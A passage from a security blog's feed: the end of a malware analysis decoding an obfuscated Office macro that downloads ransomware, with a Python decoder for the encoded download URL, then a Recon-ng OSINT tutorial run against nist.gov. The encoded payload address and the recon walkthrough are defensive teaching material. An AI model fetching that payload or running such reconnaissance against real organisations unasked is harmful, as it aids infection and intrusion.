&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;For&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LBound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;To&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UBound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DuBirMahnWeishr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;Next&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apdistance&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It performs a computation by dividing each value of the array “InTheAfrikaMountainsAreHighXSAOO” by 61, converting the value to the corrensponding character using function &lt;em&gt;Chr()&lt;/em&gt; and saving the results in “InTheAfrikaMountainsAreHigh4”, that is the variable seen before representing malware download url.&lt;br /&gt;
Converting the first values we get:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# python
&amp;gt;&amp;gt;&amp;gt; chr(6344/61)
&#39;h&#39;
&amp;gt;&amp;gt;&amp;gt; chr(7076/61)
&#39;t&#39;
&amp;gt;&amp;gt;&amp;gt; chr(6832/61)
&#39;p&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This looked promising, so I have written a simple Python script named “decrypt.py” that performs the conversion:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3538&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6649&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5917&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2745&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7015&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6954&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6588&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2806&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7076&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2867&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2928&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3477&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7137&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3416&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6710&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7381&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;Malware download address: &#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted_address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After running the script we get the decrypted value:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/macro_malware/decrypt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I thought, that string was hiding the address used by the macro to download the real payload which is then saved in the temporary directory as “zorgins.exe”; once it executes, it starts encrypting files on the machine.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sandbox dynamic analysis&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As a confirmation of what we have found, we can upload the file on the following website: &lt;a href=&quot;https://www.hybrid-analysis.com/&quot;&gt;https://www.hybrid-analysis.com/&lt;/a&gt;.&lt;br /&gt;
Hybrid Analysis is powered by Payload Security and offers a free service which performs both static and dynamic (behavioral) analysis by interacting with VirusTotal (a free virus, malware and URL online scanning service which uses more than 40 antivirus solutions to execute static analysis), Metadefender (similar to VirusTotal) and running samples in VxStream Sandbox.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/vxstream_sandbox.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/vxstream_sandbox.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once the analysis is complete it reports results back to the user, showing also screenshots saved during the execution:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution1.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/sandbox_execution2.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/sandbox_execution2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As the previous image reports, after the damage has been done, the malware shows the instructions to follow to acquire the decryption key. This can be done by navigating to a website which resides in the Tor network (accessible only by installing Tor software). Once the victim gets there, the attacker requests payment in Bitcoins (a particular currency which is not trackable) and after the money transfer has been done the victim &lt;em&gt;should&lt;/em&gt; receive the key to restore documents back to their original state.&lt;/p&gt;

&lt;p&gt;Analyzing the report we can verify that informations found during the reverse engineering activity coincide with the results returned after sandbox execution.&lt;/p&gt;

&lt;p&gt;Usage of function &lt;em&gt;AutoOpen()&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/macro_malware/autoopen.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/autoopen.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Name of dropped malware and download url including spawned processes:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/data_verification.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/data_verification.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/hybrid_analysis.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/hybrid_analysis.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Going deeper&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The analysis performed gives us even more informations such as malicious hosts related to malware download IP address:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot;&gt;&lt;img src=&quot;/images/macro_malware/malicious_hosts_ip_related.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This helps us making further analysis: the service reports that even other websites associated to that IP address are flagged as malicious; in fact, from those addresses it is pretty clear the attacker has compromised legitimate sites and he is now using them to host malware and to carry on phishing activities (look for example at Paypal reference on the last url).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Once we know the malware download address we can block it by putting the IP address of the website in Firewall/IPS blacklist. A more drastic solution is to create a new rule on the mail server/Antispam blocking all attachments with extension “.docm”.&lt;/p&gt;

&lt;p&gt;Anyway for this type of attacks the best defence is awareness: informing users of possible scams like this one is the best countermeasure you can ever implement.&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/14/macro-malware-analysis.html</guid>
        
        <category>Malware</category>
        
        <category>Ransomware</category>
        
        <category>Office macro</category>
        
        <category>Reverse engineering</category>
        
        <category>Decryption</category>
        
        <category>Sandbox</category>
        
        <category>Dynamic analysis</category>
        
        
      </item>
    
      <item>
        <title>Open Source Web Reconnaissance with Recon-ng</title>
        <description>&lt;p&gt;During a penetration test, a big part of the success in the exploitation phase depends from how good the information gathering was performed. Since this activity, especially when dealing with a huge amount of informations, is time consuming, it is a good idea to rely on tools which make reconnaissance in automated way.&lt;/p&gt;

&lt;p&gt;Recon-ng is an incredibly powerful tool for Open Source Intelligence Gathering (OSINT); actually, it is a reconnaissance framework written in Python built with a Metasploit like usage model (we will see what Metasploit is further on, for now it is enough to know that it is the most famous penetration testing framework).&lt;br /&gt;
&lt;!--more--&gt;
Reconnaissance is considered as the activity of acquiring open source informations, i.e. available on the Internet, about a target in a passive way (passive reconnaissance); conversely, discovery is the activity which permits to acquire informations by sending packets directly to the target (active reconnaissance). Even if Recon-ng is mainly a passive reconnaissance framework, it includes also some elements for discovery and exploitation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since we will use a lot of tools during the next posts, I highly suggest to set up a Virtual Machine with a Penetration Testing distribution installed on.
Personally I use VMware Workstation 12 Player as hypervisor for server and desktop virtualization which is free and can be downloaded from the official website. Regarding operating systems, I use mainly Kali Linux, which is a Debian based distribution. This distro is very useful because it has a pretty good number of tools preinstalled and preconfigured leaving to the user a ready to use PT machine. I will not explain how to set up a VM since you can find a lot of tutorials about that on the web.&lt;/p&gt;

&lt;p&gt;Anyway, you can still download Recon-ng on your favorite Linux distribution from author repository using &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone&lt;/code&gt; and installing required dependencies (this is also an option in Kali Linux in case you want the latest version available): &lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/recon-ng&quot;&gt;https://bitbucket.org/LaNMaSteR53/recon-ng&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, we can start Recon-ng in different ways. One is by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt;  Information Gathering &amp;gt; recon-ng&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_start.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_start2.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;recon-ng&lt;/code&gt;. In any case, we are prompted with the framework banner, version and number of modules for each category:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Modules are the core of the framework and in the current version there are five categories:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Recon modules - for reconnaissance activities;&lt;/li&gt;
  &lt;li&gt;Reporting modules - for reporting results on a file;&lt;/li&gt;
  &lt;li&gt;Import modules - for importing values from a file into a database table;&lt;/li&gt;
  &lt;li&gt;Exploitation modules - for explotation activities;&lt;/li&gt;
  &lt;li&gt;Discovery modules - for discovery activities.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The good thing is that everyone can implement his own module written in Python and integrate it inside the framework.&lt;br /&gt;
Since we are dealing with information gathering, we will focus on recon modules.&lt;br /&gt;
The framework accepts commands via command line; to have a list of the commands just type &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; and press enter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; help

Commands (type [help|?] &amp;lt;topic&amp;gt;):
---------------------------------
add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To display a list of all available modules for each category we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show modules
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Since right now we are only interested in recon modules, we can limit the search to them:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; show modules recon

  Recon
  -----
    recon/companies-contacts/bing_linkedin_cache
    recon/companies-contacts/indeed
    recon/companies-contacts/jigsaw/point_usage
    recon/companies-contacts/jigsaw/purchase_contact
    recon/companies-contacts/jigsaw/search_contacts
    recon/companies-contacts/linkedin_auth
    recon/companies-multi/github_miner
    recon/companies-multi/whois_miner
    recon/contacts-contacts/mailtester
    recon/contacts-contacts/mangle
    recon/contacts-contacts/unmangle
    recon/contacts-credentials/hibp_breach
    recon/contacts-credentials/hibp_paste
    recon/contacts-domains/migrate_contacts
    recon/contacts-profiles/fullcontact
    recon/credentials-credentials/adobe
    recon/credentials-credentials/bozocrack
    recon/credentials-credentials/hashes_org
    recon/domains-contacts/metacrawler
    recon/domains-contacts/pgp_search
    recon/domains-contacts/whois_pocs
    recon/domains-credentials/pwnedlist/account_creds
    recon/domains-credentials/pwnedlist/api_usage
    recon/domains-credentials/pwnedlist/domain_creds
    recon/domains-credentials/pwnedlist/domain_ispwned
    recon/domains-credentials/pwnedlist/leak_lookup
    recon/domains-credentials/pwnedlist/leaks_dump
    recon/domains-domains/brute_suffix
    recon/domains-hosts/bing_domain_api
    recon/domains-hosts/bing_domain_web
    recon/domains-hosts/brute_hosts
    recon/domains-hosts/builtwith
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web
    ...................................

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The structure for each module is the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module-category/data-conversion/module-name
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Consider, for example, &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/domains-hosts/google_site_web&lt;/code&gt;: this performs a recon activity using Google Search Engine to convert an information about a domain into data about hosts of that domain. Keep in mind that certain modules require valid API key to run; some keys can be acquired by simply registering on the related website.&lt;br /&gt;
To select a module we need the &lt;code class=&quot;highlighter-rouge&quot;&gt;use&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use recon/domains-hosts/google_site_web
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once the module is selected we can show informations about it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default][google_site_web] &amp;gt; show info

      Name: Google Hostname Enumerator
      Path: modules/recon/domains-hosts/google_site_web.py
    Author: Tim Tomes (@LaNMaSteR53)

Description:
  Harvests hosts from Google.com by using the &#39;site&#39; search operator. Updates the &#39;hosts&#39; table with
  the results.

Options:
  Name    Current Value  Required  Description
  ------  -------------  --------  -----------
  SOURCE  default        yes       source of input (see &#39;show info&#39; for details)

Source Options:
  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
  &amp;lt;string&amp;gt;       string representing a single input
  &amp;lt;path&amp;gt;         path to a file containing a list of inputs
  query &amp;lt;sql&amp;gt;    database query returning one column of inputs
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this way we can read the description and take a look at the options we can set before running the recon activity. As you can see, the action performed by this module is pretty the same as the one explained in the article &lt;a href=&quot;https://spreadsecurity.github.io/2016/07/18/information-gathering-with-google-search-engine.html&quot; target=&quot;_blank&quot;&gt;Information gathering with Google Search Engine&lt;/a&gt;, but this time it is done in an automated way.&lt;br /&gt;
In case we want to analyze module source code we can either use &lt;code class=&quot;highlighter-rouge&quot;&gt;show source&lt;/code&gt; or navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/recon-ng/modules/recon/domains-hosts&lt;/code&gt; where the python file &lt;code class=&quot;highlighter-rouge&quot;&gt;google_site_web.py&lt;/code&gt; is located (note that folders structure reflects modules categories and data conversions).&lt;br /&gt;
Once all required options are set up through &lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt; command, the module can be executed with &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will see now an example of reconnaissance activity performed on the National Institute of Standards and Technology (NIST) domain.&lt;br /&gt;
Before starting, we need to introduce the concept of workspace: Recon-ng allows to define a workspace for each target subject of reconnaissance; by doing this, it will create a database containing all gathered informations about the target itself. This is the reason why in the “framework help” shown before there is the &lt;code class=&quot;highlighter-rouge&quot;&gt;query&lt;/code&gt; command, which allows to examine the DB using Standard Query Language (SQL), and also why import modules are present.&lt;/p&gt;

&lt;p&gt;We start by creating a new workspace:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;workspaces add NIST
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After that, the command line shows the change from the default workspace to the new one.
Then we need to associate a domain with the created workspace and finally we can check that everything is set up correctly by listing domains with &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; workspaces add NIST
[recon-ng][NIST] &amp;gt; add domains nist.gov
[recon-ng][NIST] &amp;gt; show domains

  +---------------------------------+
  | rowid |  domain  |    module    |
  +---------------------------------+
  | 1     | nist.gov | user_defined |
  +---------------------------------+

[*] 1 rows returned
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Same result can be obtained with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; query select * from domains
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be checked also by querying the database with an external tool; the DB is located in the following folder:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/.recon-ng/workspaces/NIST
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Here there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;data.db&lt;/code&gt; which is the database for NIST workspace; to explore the DB we can use the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;sqlite3&lt;/code&gt; already installed in Kali Linux:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/.recon-ng/workspaces/NIST# sqlite3 data.db 
SQLite version 3.13.0 2016-05-18 10:57:30
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; select * from domains;
nist.gov|user_defined
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To exit from the program, just type &lt;code class=&quot;highlighter-rouge&quot;&gt;.exit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can also add a company name:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; add companies
company (TEXT): NIST
description (TEXT): National Institute of Standards and Technology
[recon-ng][NIST] &amp;gt; show companies

  +---------------------------------------------------------------------------------+
  | rowid | company |                  description                   |    module    |
  +---------------------------------------------------------------------------------+
  | 1     | NIST    | National Institute of Standards and Technology | user_defined |
  +---------------------------------------------------------------------------------+

[*] 1 rows returned
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Adding domains and companies is the initial step because they are inputs used by modules to perform information gathering. To check all modules using these two informations as a starting point we can leverage the &lt;code class=&quot;highlighter-rouge&quot;&gt;search&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; search domains-
[*] Searching for &#39;domains-&#39;...

  Recon
  -----
    recon/domains-contacts/metacrawler
    recon/domains-contacts/pgp_search
    recon/domains-contacts/whois_pocs
    recon/domains-credentials/pwnedlist/account_creds
    recon/domains-credentials/pwnedlist/api_usage
    recon/domains-credentials/pwnedlist/domain_creds
    recon/domains-credentials/pwnedlist/domain_ispwned
    recon/domains-credentials/pwnedlist/leak_lookup
    recon/domains-credentials/pwnedlist/leaks_dump
    recon/domains-domains/brute_suffix
    recon/domains-hosts/bing_domain_api
    recon/domains-hosts/bing_domain_web
    recon/domains-hosts/brute_hosts
    recon/domains-hosts/builtwith
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web
    recon/domains-hosts/hackertarget
    recon/domains-hosts/netcraft
    recon/domains-hosts/shodan_hostname
    recon/domains-hosts/ssl_san
    recon/domains-hosts/vpnhunter
    recon/domains-vulnerabilities/ghdb
    recon/domains-vulnerabilities/punkspider
    recon/domains-vulnerabilities/xssed
    recon/domains-vulnerabilities/xssposed

[recon-ng][NIST] &amp;gt; search companies-
[*] Searching for &#39;companies-&#39;...

  Recon
  -----
    recon/companies-contacts/bing_linkedin_cache
    recon/companies-contacts/indeed
    recon/companies-contacts/jigsaw/point_usage
    recon/companies-contacts/jigsaw/purchase_contact
    recon/companies-contacts/jigsaw/search_contacts
    recon/companies-contacts/linkedin_auth
    recon/companies-multi/github_miner
    recon/companies-multi/whois_miner

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Suppose we want to start populating our DB with hostnames related to &lt;em&gt;nist.gov&lt;/em&gt; domain usign &lt;code class=&quot;highlighter-rouge&quot;&gt;google_site_web&lt;/code&gt; module seen before; to check parameters required to run it we can display module options:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; show options

  Name    Current Value  Required  Description
  ------  -------------  --------  -----------
  SOURCE  default        yes       source of input (see &#39;show info&#39; for details)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Since we have already set the domain, the “Current Value” which says “default” is taken directly from the DB. Then, we can just run the module and after a little while we get the results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; run

--------
NIST.GOV
--------
[*] Searching Google for: site:nist.gov
[*] [host] www.nsrl.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] gams.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] physics.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] face.nist.gov (&amp;lt;blank&amp;gt;)
